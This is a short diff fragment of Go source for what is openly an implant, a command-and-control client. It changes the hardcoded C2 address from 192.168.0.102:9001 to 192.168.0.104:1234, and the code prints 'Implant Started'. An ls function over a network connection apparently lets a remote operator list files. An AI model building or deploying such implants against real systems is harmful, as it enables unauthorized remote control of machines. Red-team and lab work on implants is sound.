@@ -142,7 +142,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.102:9001"
+	c2Address := "192.168.0.104:1234"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
